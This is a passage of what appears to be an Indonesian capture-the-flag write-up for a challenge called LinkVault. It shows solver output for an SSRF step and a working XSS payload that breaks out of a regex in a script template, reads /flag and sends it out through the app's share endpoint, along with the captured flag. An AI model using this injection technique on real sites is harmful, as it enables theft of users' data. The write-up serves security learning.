# LinkVault — Eksploitasi / Solver

[← Overview](49-linkvault.md) · [Index](index.md)

## 3.3 Output asli

```text
===== register =====
POST http://s1.nfx.my.id:49191/register /register
HTTP 302
Set-Cookie: session=13607920e94a11cd; Path=/
Location: /dashboard

===== submit benign SSRF =====
POST http://s1.nfx.my.id:49191/submit /submit
HTTP 200
...
queued: False   # marker yang dicek script berbeda; lihat bukti HTML di bawah

filter payload: ./;fetch('/flag').then(function(r){return r.text()}).then(function(t){fetch('/api/share?to=lvr100242&d='+encodeURIComponent(t))});var q=/.

===== submit malicious SSRF =====
POST http://s1.nfx.my.id:49191/submit /submit
HTTP 200
...
[*] waiting for bot... 2s
[*] waiting for bot... 12s
[*] waiting for bot... 22s

[+] flag in /reports after 32s: NFX{L1nkV4ult_cve_26_3p1c_!}
FLAG=NFX{L1nkV4ult_cve_26_3p1c_!}
```

Catatan: script awal mengecek string `"Queued for moderation review."`, sedangkan UI live memakai `"Link successfully queued for moderation"`. Marker yang benar terlihat di HTML respons:

```text
Link successfully queued for moderation
PREVIEW CAPTURE READY
{"ok":true,"queued":true,"source":"crawler"}
```

Jadi SSRF terbukti dari body respons, dan XSS terbukti dari flag yang muncul di `/reports`.

## 3.4 Payload XSS yang terbentuk

Filter:

```text
./;fetch('/flag').then(function(r){return r.text()}).then(function(t){fetch('/api/share?to=lvr100242&d='+encodeURIComponent(t))});var q=/.
```

Hasil render (konseptual):

```html
<script>if (true) { /./;fetch('/flag').then(function(r){return r.text()}).then(function(t){fetch('/api/share?to=lvr100242&d='+encodeURIComponent(t))});var q=/./g.test("x") }</script>
```

Regex pertama `/./` valid, lalu statement `fetch(...)` dieksekusi, lalu `var q=/./g` melanjutkan sisa template.
